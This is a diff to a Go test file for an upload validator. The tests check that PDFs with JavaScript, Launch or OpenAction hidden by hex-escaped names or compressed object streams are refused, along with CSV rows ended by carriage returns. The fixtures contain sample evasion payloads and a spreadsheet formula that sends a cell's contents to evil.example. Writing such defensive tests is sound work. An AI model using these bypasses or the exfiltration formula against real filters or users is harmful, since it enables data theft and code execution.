@@ -8,6 +8,7 @@ import (
 	"compress/zlib"
 	"encoding/binary"
 	"hash/crc32"
+	"strconv"
 	"strings"
 	"testing"
 	"time"
@@ -64,6 +65,33 @@ func png(w, h int, withPixels bool) []byte {
 func pdf(extra string) []byte {
 	return []byte("%PDF-1.7\n1 0 obj\n<< /Type /Catalog " + extra +
 		" >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n")
+}
+
+// pdfObjects builds a PDF that keeps an object in an object stream, as
+// qpdf --object-streams=generate, Acrobat and pdfTeX write them, with
+// dict the start of the stream's own dictionary. The stream is compressed
+// when compress is true, and then the object is nowhere in the file as
+// written: a stream this short would be stored rather than compressed, so
+// the ordinary objects after it give the compressor something to do.
+func pdfObjects(t *testing.T, dict, object string, compress bool) []byte {
+	t.Helper()
+	header := "2 0 "
+	data := []byte(header + object + "\n" +
+		strings.Repeat("<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\n", 20))
+	if compress {
+		var z bytes.Buffer
+		zw := zlib.NewWriter(&z)
+		_, _ = zw.Write(data)
+		_ = zw.Close()
+		data = z.Bytes()
+		if bytes.Contains(data, []byte(object)) {
+			t.Fatalf("the fixture's object is in the file as written: %q", data)
+		}
+	}
+	return []byte("%PDF-1.7\n5 0 obj\n<< " + dict + " /N 1 /First " +
+		strconv.Itoa(len(header)) + " /Length " + strconv.Itoa(len(data)) +
+		" >>\nstream\n" + string(data) + "\nendstream\nendobj\n" +
+		"trailer\n<< /Root 2 0 R >>\n%%EOF\n")
 }
 
 // -- the happy path ----------------------------------------------------------
@@ -244,6 +272,215 @@ func TestAPDFThatActsIsRefused(t *testing.T) {
 	}
 	if _, err := Accept("report.pdf", pdf("/Pages 2 0 R"), now); err != nil {
 		t.Errorf("an ordinary PDF was refused: %v", err)
+	}
+}
+
+// A name is the same name however it is spelled. PDF lets any character
+// of one be written as # and two hex digits, and every viewer reads
+// /J#61vaScript as /JavaScript. The check was a byte search for the plain
+// spelling, so each construct it refuses went through written that way.
+func TestAPDFThatActsIsRefusedHoweverItsNamesAreSpelled(t *testing.T) {
+	for _, construct := range []string{
+		"/J#61vaScript (app.alert\\(1\\))",
+		"/#4a#53 (x)",
+		"/Open#41ction 3 0 R",
+		"/L#61unch << /F (calc.exe) >>",
+		"/Embedded#46ile 2 0 R",
+		"/#41#41 << /O 3 0 R >>",
+		"/XF#41 3 0 R",
+		"/RichMedi#61 3 0 R",
+	} {
+		if _, err := Accept("report.pdf", pdf(construct), now); err == nil {
+			t.Errorf("a PDF containing %s was accepted", construct)
+		}
+	}
+	// Control: an ordinary name spelled the same way is an ordinary name.
+	if _, err := Accept("report.pdf", pdf("/Pages 2 0 R /#50age#4Cayout /SinglePage"), now); err != nil {
+		t.Errorf("an ordinary PDF with an escaped name was refused: %v", err)
+	}
+}
+
+// A name is refused as itself, not as the start of a longer one, and a
+// document that opens at a page does nothing by it. ReportLab names a
+// font's subset AAAAAA+, which is not /AA, and LibreOffice gives the page
+// a document opens at as an /OpenAction destination, which runs nothing
+// (TestAPaperThatOpensAtAPageIsTaken has the way pdfLaTeX gives it). The
+// byte search refused both; once object streams are read as well, it
+// would have refused every document written with them that did either.
+func TestAPDFIsRefusedForWhatItDoesNotForTheLettersOfAName(t *testing.T) {
+	for _, ordinary := range []string{
+		"/OpenAction [2 0 R /XYZ null null 0]",
+		"/OpenAction[2 0 R/Fit]",
+		"/Font << /F1 << /BaseFont /AAAAAA+DejaVuSans >> >>",
+		"/Names << /JSX 3 0 R >>",
+	} {
+		if _, err := Accept("report.pdf", pdf(ordinary), now); err != nil {
+			t.Errorf("a PDF containing %s was refused: %v", ordinary, err)
+		}
+		if _, err := Accept("report.pdf", pdfObjects(t, "/Type /ObjStm /Filter /FlateDecode",
+			"<< /Type /Catalog "+ordinary+" >>", true), now); err != nil {
+			t.Errorf("a PDF containing %s in an object stream was refused: %v", ordinary, err)
+		}
+	}
+	// What each of those is not.
+	for _, acts := range []string{
+		"/OpenAction 3 0 R",
+		"/OpenAction<</S/GoToR/F(x.pdf)>>",
+		"/AA<</O 3 0 R>>",
+		"/Names << /EmbeddedFiles 3 0 R >>",
+		"/S /RichMediaExecute",
+	} {
+		if _, err := Accept("report.pdf", pdf(acts), now); err == nil {
+			t.Errorf("a PDF containing %s was accepted", acts)
+		}
+	}
+}
+
+// What a viewer finds inside an object stream it obeys as it would
+// anywhere else, and a PDF written since version 1.5 may keep all its
+// dictionaries in one, compressed. The byte search saw only the compressed
+// bytes, so a catalog with an /OpenAction, or a JavaScript action, went
+// through as soon as it was written the way qpdf, Acrobat and pdfTeX write
+// objects.
+//
+// One that cannot be read is refused rather than taken on trust: what it
+// holds cannot be checked, and a stream encoded some other way, or with
+// decoding parameters, or encrypted, is how the next file would hide it.
+func TestAPDFThatActsInsideAnObjectStreamIsRefused(t *testing.T) {
+	for name, f := range map[string][]byte{
+		"an action when opened": pdfObjects(t, "/Type /ObjStm /Filter /FlateDecode",
+			"<< /Type /Catalog /OpenAction 3 0 R >>", true),
+		"JavaScript": pdfObjects(t, "/Type /ObjStm /Filter /FlateDecode",
+			"<< /S /JavaScript /JS (app.alert\\(1\\)) >>", true),
+		"its dictionary's names escaped": pdfObjects(t, "/Type /Obj#53tm /Filter /Fl#61teDecode",
+			"<< /S /Launch /F (calc.exe) >>", true),
+		"no type, as a viewer that reads /First takes it": pdfObjects(t, "/Filter [ /Fl ]",
+			"<< /Names << /EmbeddedFiles 3 0 R >> >>", true),
+		"the name inside escaped": pdfObjects(t, "/Type /ObjStm /Filter /FlateDecode",
+			"<< /Type /Catalog /Open#41ction 3 0 R >>", true),
+		"uncompressed": pdfObjects(t, "/Type /ObjStm",
+			"<< /Type /Catalog /OpenAction 3 0 R >>", false),
+	} {
+		if _, err := Accept("report.pdf", f, now); err == nil {
+			t.Errorf("a PDF with %s in an object stream was accepted", name)
+		}
+	}
+	for name, f := range map[string][]byte{
+		"another encoding": pdfObjects(t, "/Type /ObjStm /Filter /ASCIIHexDecode",
+			"<< /Type /Pages /Kids [] /Count 0 >>", false),
+		"decoding parameters": pdfObjects(t, "/Type /ObjStm /Filter /FlateDecode /DecodeParms << /Predictor 12 /Columns 4 >>",
+			"<< /Type /Pages /Kids [] /Count 0 >>", true),
+		"its filter elsewhere": pdfObjects(t, "/Type /ObjStm /Filter 7 0 R",
+			"<< /Type /Pages /Kids [] /Count 0 >>", true),
+		"damaged or encrypted data": pdfObjects(t, "/Type /ObjStm /Filter /FlateDecode",
+			"<< /Type /Pages /Kids [] /Count 0 >>", false),
+	} {
+		if _, err := Accept("report.pdf", f, now); err == nil {
+			t.Errorf("a PDF with an object stream in %s, which cannot be read, was accepted", name)
+		}
+	}
+
+	// Control: an ordinary document written with object streams is taken,
+	// and so is an image whose stream is encoded in a way this does not
+	// read, since it holds no objects.
+	for name, f := range map[string][]byte{
+		"compressed":          pdfObjects(t, "/Type /ObjStm /Filter /FlateDecode", "<< /Type /Pages /Kids [] /Count 0 >>", true),
+		"in a filter list":    pdfObjects(t, "/Type /ObjStm /Filter [/FlateDecode]", "<< /Type /Pages /Kids [] /Count 0 >>", true),
+		"uncompressed":        pdfObjects(t, "/Type /ObjStm", "<< /Type /Pages /Kids [] /Count 0 >>", false),
+		"beside a JPEG image": []byte("%PDF-1.7\n4 0 obj\n<< /Type /XObject /Subtype /Image /Width 1 /Height 1 /Filter /DCTDecode /Length 4 >>\nstream\n\xff\xd8\xff\xd9\nendstream\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n"),
+	} {
+		if _, err := Accept("report.pdf", f, now); err != nil {
+			t.Errorf("an ordinary PDF %s was refused: %v", name, err)
+		}
+	}
+}
+
+// pdfNumbered builds a PDF of objects numbered from 1: kept in one object
+// stream, compressed, when stream is true, as pdfTeX keeps them, and
+// written out one by one otherwise. more is written after them, as an
+// update to a file appends objects. As in pdfObjects, what follows the
+// objects in the stream gives the compressor something to do.
+func pdfNumbered(t *testing.T, stream bool, more string, objects ...string) []byte {
+	t.Helper()
+	var f strings.Builder
+	f.WriteString("%PDF-1.5\n")
+	if !stream {
+		for i, o := range objects {
+			f.WriteString(strconv.Itoa(i+1) + " 0 obj\n" + o + "\nendobj\n")
+		}
+	} else {
+		var header, body strings.Builder
+		for i, o := range objects {
+			header.WriteString(strconv.Itoa(i+1) + " " + strconv.Itoa(body.Len()) + " ")
+			body.WriteString(o + "\n")
+		}
+		var z bytes.Buffer
+		zw := zlib.NewWriter(&z)
+		_, _ = zw.Write([]byte(header.String() + body.String() +
+			strings.Repeat("<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\n", 20)))
+		_ = zw.Close()
+		if bytes.Contains(z.Bytes(), []byte("/OpenAction")) {
+			t.Fatalf("the fixture's catalog is in the file as written: %q", z.Bytes())
+		}
+		f.WriteString(strconv.Itoa(len(objects)+1) + " 0 obj\n<< /Type /ObjStm /N " +
+			strconv.Itoa(len(objects)) + " /First " + strconv.Itoa(header.Len()) +
+			" /Filter /FlateDecode /Length " + strconv.Itoa(z.Len()) + " >>\nstream\n" +
+			z.String() + "\nendstream\nendobj\n")
+	}
+	f.WriteString(more + "trailer\n<< /Root 1 0 R >>\n%%EOF\n")
+	return []byte(f.String())
+}
+
+// A paper opens at its first page by an action that goes there, and that
+// is all it does. pdfLaTeX and LuaLaTeX write the page hyperref opens a
+// paper at as /OpenAction 4 0 R, object 4 being << /S /GoTo /D [...] >>,
+// and keep both in an object stream. The check let through only an
+// /OpenAction written as a destination array, so once it read object
+// streams it refused every paper written that way with hyperref, which it
+// had taken when it could not see inside them.
+//
+// An action that goes anywhere else, does something more after going
+// there, or cannot be found to be sure of, is still refused.
+func TestAPaperThatOpensAtAPageIsTaken(t *testing.T) {
+	catalog := "<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R /PageMode /UseOutlines >>"
+	pages := "<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
+	page := "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>"
+	goTo := "<< /S /GoTo /D [3 0 R /Fit] >>"
+	for name, f := range map[string][]byte{
+		"in an object stream, as pdfTeX writes it": pdfNumbered(t, true, "", catalog, pages, page, goTo),
+		"written out, as pdfTeX writes a PDF 1.4":  pdfNumbered(t, false, "", catalog, pages, page, "<</D[3 0 R/Fit]/S/GoTo>>"),
+		"its names escaped":                        pdfNumbered(t, true, "", catalog, pages, page, "<< /S /Go#54o /D [3 0 R /Fit] >>"),
+		"going to a destination kept on its own":   pdfNumbered(t, true, "", catalog, pages, page, "[3 0 R /XYZ null null 0]"),
+		"with the action in the catalog": pdfNumbered(t, true, "",
+			"<< /Type /Catalog /Pages 2 0 R /OpenAction << /Type /Action /S /GoTo /D [3 0 R /Fit] >> >>", pages, page),
+	} {
+		if _, err := Accept("paper.pdf", f, now); err != nil {
+			t.Errorf("a paper that opens at a page, %s, was refused: %v", name, err)
+		}
+	}
+
+	for name, f := range map[string][]byte{
+		"a web address": pdfNumbered(t, true, "", catalog, pages, page,
+			"<< /S /URI /URI (https://tracker.example/opened) >>"),
+		"another file": pdfNumbered(t, true, "", catalog, pages, page,
+			"<< /S /GoToR /F (\\\\\\\\files.example\\\\share\\\\x.pdf) /D [0 /Fit] >>"),
+		"going there and then doing more": pdfNumbered(t, true, "", catalog, pages, page,
+			"<< /S /GoTo /D [3 0 R /Fit] /Next 5 0 R >>", "<< /S /URI /URI (https://tracker.example/) >>"),
+		"going there and then doing more, in the catalog": pdfNumbered(t, true, "",
+			"<< /Type /Catalog /OpenAction << /S /GoTo /D [3 0 R /Fit] /Next << /S /URI /URI (https://x.example/) >> >> >>"),
+		"an object that is not there": pdfNumbered(t, true, "",
+			"<< /Type /Catalog /Pages 2 0 R /OpenAction 9 0 R >>", pages, page),
+		"an object written twice, once as something else": pdfNumbered(t, true,
+			"4 0 obj\n<< /S /URI /URI (https://tracker.example/) >>\nendobj\n", catalog, pages, page, goTo),
+		"an end of the object inside a string": pdfNumbered(t, false, "", catalog, pages, page,
+			"<< /S /GoTo /D [3 0 R /Fit] /X (endobj) /S /URI /URI (https://tracker.example/) >>"),
+		"an object in a stream whose objects cannot be told apart": []byte("%PDF-1.5\n1 0 obj\n" + catalog +
+			"\nendobj\n5 0 obj\n<< /Type /ObjStm /N 1 /First 6 0 R >>\nstream\n4 0 << /S /URI /URI (https://tracker.example/) >>\nendstream\nendobj\n" +
+			"6 0 obj\n4\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n"),
+	} {
+		if _, err := Accept("paper.pdf", f, now); err == nil {
+			t.Errorf("a PDF that opens with %s was accepted", name)
+		}
 	}
 }
 
@@ -463,6 +700,36 @@ func TestEveryAcceptedFormatHasBoundsAndAVerifier(t *testing.T) {
 		}
 		if fm.MIME == "" || fm.Kind == "" {
 			t.Errorf("%s is missing its MIME type or kind", name)
+		}
+	}
+}
+
+// A carriage return ends a line as a line feed does, because a spreadsheet
+// reads one as the end of a row: the classic Mac form of the file, with
+// nothing but carriage returns, is one every spreadsheet still opens.
+//
+// The check read lines only at a line feed, so in that form the whole file
+// was one line, and a formula at the start of every row but the first was
+// in the middle of a cell beginning with the last row's last value. A file
+// a visitor attached to a form, with a formula in any of those places, was
+// accepted, and ran when the site's owner opened it.
+func TestAFormulaAfterACarriageReturnIsRefused(t *testing.T) {
+	formula := `=HYPERLINK("http://evil.example/?"&B2)`
+	for name, body := range map[string]string{
+		"at the start of a row":          "a,b\r" + formula + ",2\r",
+		"after a separator":              "a,b\r1," + formula + "\r",
+		"after a semicolon":              "a;b\r1;" + formula + "\r",
+		"in a quoted cell":               "a,b\r\"" + formula + "\",2\r",
+		"after a carriage return in one": "a,b\r\n1,x\r" + formula + "\r\n",
+	} {
+		if _, err := Accept("data.csv", []byte(body), now); err == nil {
+			t.Errorf("a CSV with a formula %s, in rows ended by carriage returns, was accepted", name)
+		}
+	}
+	// Control: the same file without a formula is taken, in either form.
+	for _, body := range []string{"name,balance\rAda,-4.5\rGrace,12\r", "name,balance\r\nAda,-4.5\r\n"} {
+		if _, err := Accept("data.csv", []byte(body), now); err != nil {
+			t.Errorf("an ordinary CSV was refused: %v\n%q", err, body)
 		}
 	}
 }
